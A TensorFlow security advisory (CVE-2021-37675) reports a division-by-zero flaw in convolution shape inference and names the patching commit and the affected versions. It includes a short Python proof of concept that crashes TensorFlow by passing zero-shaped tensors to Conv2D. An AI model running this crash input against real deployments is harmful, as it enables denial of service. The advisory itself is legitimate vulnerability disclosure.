<h2>TFSA-2021-150: Division by 0 in most convolution operators</h2>
<h3>CVE Number</h3>
<p>CVE-2021-37675</p>
<h3>Impact</h3>
<p>Most implementations of convolution operators in TensorFlow are affected by a
division by 0 vulnerability where an attacker can trigger a denial of service
via a crash:</p>
<p>```python
import tensorflow as tf</p>
<p>tf.compat.v1.disable_v2_behavior()
tf.raw_ops.Conv2D(
  input = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32),
  filter = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32),
  strides = [1, 1, 1, 1],
  padding = "SAME")
```</p>
<p>The shape inference

is missing several validations before doing divisions and modulo operations.</p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commit
<a href="https://github.com/tensorflow/tensorflow/commit/8a793b5d7f59e37ac7f3cd0954a750a2fe76bad4">8a793b5d7f59e37ac7f3cd0954a750a2fe76bad4</a>.</p>
<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this
commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are
also affected and still in supported range.</p>
